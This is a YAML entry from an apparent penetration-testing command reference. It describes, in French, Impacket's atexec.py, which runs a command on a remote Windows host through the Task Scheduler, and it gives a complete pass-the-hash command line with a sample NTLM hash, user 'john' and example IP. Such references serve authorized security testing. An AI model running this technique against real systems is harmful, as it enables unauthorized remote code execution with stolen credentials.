---
description: |
  La commande atexec.py d'Impacket utilise le service de planification des tâches sur l'hôte Windows distant pour exécuter la commande donnée. Il créera une tâche Windows avec un nom aléatoire, déclenchera la tâche, puis la supprimera. La commande suivante exécute `whoami` sur l'hôte Windows distant, en s'authentifiant avec le hash de l'utilisateur `john`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

  	Command Executed: whoami
command: |
  python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami
items:
  - Hash
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
  - Approved-tool
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py
  - https://u0041.co/blog/post/1
---
